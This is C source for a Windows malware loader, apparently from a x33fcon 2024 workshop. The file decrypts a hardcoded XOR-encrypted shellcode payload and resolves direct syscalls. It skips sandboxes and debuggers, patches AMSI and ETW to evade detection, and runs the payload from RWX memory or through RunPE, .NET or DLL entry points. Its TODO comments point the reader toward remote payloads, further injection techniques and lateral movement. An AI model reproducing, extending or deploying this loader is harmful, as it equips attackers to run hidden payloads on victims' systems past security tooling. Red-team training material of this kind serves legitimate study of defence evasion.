#include <windows.h>
#include "defines.h"
#include "auxiliary/syscalls.h"
#include "evasion/patch_amsi_etw.h"
#include "sandbox/domain.h"
#include "debug/debug_peb.h"

#ifdef RUN_PE
#include "execution/runpe.h"
#endif

#ifdef RUN_DOTNET
#include "execution/dotnet.h"
#endif

#ifdef VERBOSE
#define DBG(...) printf(__VA_ARGS__ "\n")
#else
#define DBG(...)
#endif

/**
 * XOR encrypts a payload with the given key and stores the result in "output".
 */
VOID 
XorCrypt(
    PCHAR payload, 
    PCHAR key,
    PCHAR output, 
    INT payloadLen
)
{
    INT keyLength = strlen(key);
    for (INT i = 0; i < payloadLen; ++i)
    {
        output[i] = payload[i] ^ key[i % keyLength];
    }
}

/**
 * Unpack the payload and run it. 
 */
INT
Run()
{
    NTSTATUS ntStatus;
    HMODULE  hNtdll;
    SIZE_T   payloadLen             = SHELLCODE_LEN;
    CHAR     payload[SHELLCODE_LEN] = SHELLCODE;

#ifdef SANDBOX_DOMAIN
    if (!IsDomainJoined()) 
    {
        return 0;
    }
#endif

#ifdef ANTI_DEBUG
    if (IsBeingDebugged_PEB())
    {
        return 0;
    }
#endif

    // --------------------------------------------------------------------------------------
    // Resolve syscalls. See syscalls.h for more info.

    DBG("[*] Resolving syscalls...");
    hNtdll = HlpGetModuleHandle(L"ntdll.dll");
    PopulateSyscallMap(hNtdll);
    _NtProtectVirtualMemory  = GetSyscallEntry("ZwProtectVirtualMemory");
    _NtAllocateVirtualMemory = GetSyscallEntry("ZwAllocateVirtualMemory");
    // add more syscalls when needed
    DBG("[*] Done");

    // --------------------------------------------------------------------------------------

#ifdef PATCH_ETW
    if (!PatchETW(hNtdll))
    {
        return 1;
    }
    DBG("[*] patched ETW");
#endif

#ifdef PATCH_AMSI
    if (!PatchAMSI())
    {
        return 2;
    }
    DBG("[*] patched AMSI");
#endif

    // --------------------------------------------------------------------------------------

    // Allocate memory for payload 

    ULONG  ulOld        = 0;
    LPVOID pAllocMem    = NULL;    
    SIZE_T allocSizeOut = payloadLen;

    PrepareSyscall(_NtAllocateVirtualMemory->syscallNumber, _NtAllocateVirtualMemory->syscallInstructionAddress);
    ntStatus = Syscall_NtAllocateVirtualMemory(
        GetCurrentProcess(), 
        &pAllocMem, 
        (ULONG_PTR)NULL, 
        &allocSizeOut, 
        MEM_COMMIT, 
        PAGE_READWRITE
    );
    
    if (!NT_SUCCESS(ntStatus))
    {
        exit(GetLastError());
    }

    DBG("[*] Allocated memory for payload");

    // Decrypt and copy to allocated memory

    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //
    // TODO FOR YOU: Read the encrypted code from a (remote? local?) file instead of using the hardcoded payload //
    //               Maybe add a flag such as --shellcode-file and add the appropriate #ifdefs                   //
    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //

    CHAR decryptedPayload[SHELLCODE_LEN] = { 0 };
    XorCrypt(payload, ENCRYPTION_KEY, decryptedPayload, payloadLen);
    RtlCopyMemory(pAllocMem, decryptedPayload, payloadLen);
    
    DBG("[*] Decrypted payload");

    // --------------------------------------------------------------------------------------

#ifdef INJECT_SHELLCODE
    // Make shellcode page executable
    DWORD dwOld;
    PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
    ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), &pAllocMem, (SIZE_T*)&payloadLen, PAGE_EXECUTE_READWRITE, &dwOld); // hmmm.... :)

    if (!NT_SUCCESS(ntStatus))
    {
        exit(GetLastError());
    }

    DBG("[*] Protected payload: RWX");

    // Run via direct pointer
    ((VOID(*)())pAllocMem)();

    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //
    // TODO FOR YOU: Add other shellcode execution methods. Process Mockingjay? Remote injection? PoolParty? //
    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //
#endif

#ifdef RUN_PE
    RunPortableExecutable(pAllocMem, hNtdll);
#endif

#ifdef RUN_DOTNET
    RunDotnetAssembly(pAllocMem, SHELLCODE_LEN);
#endif

    // --------------------------------------------------------------------------------------
    // Cleanup

    FreeSyscallMap();

    return 0; 
}

#ifndef AS_DLL
/**
 * Entry if compiled as EXE
 */
INT 
main()
{
    DBG("[*] Hello from malware made at x33fcon '24 :3");
    return Run();
}
#endif

#ifdef AS_DLL
/**
 * Entry if compiled as DLL
 */
BOOL 
APIENTRY 
DllMain(
    HANDLE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved 
)
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            Run();
            break;
        case DLL_THREAD_ATTACH:  // A process is creating a new thread.
        case DLL_THREAD_DETACH:  // A thread exits normally.
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
    }
    return TRUE;
}
#endif

// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~ //
// TODO FOR YOU: Besides DLL and EXE, maybe a service-executable can be useful for lateral movement //
// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~ //
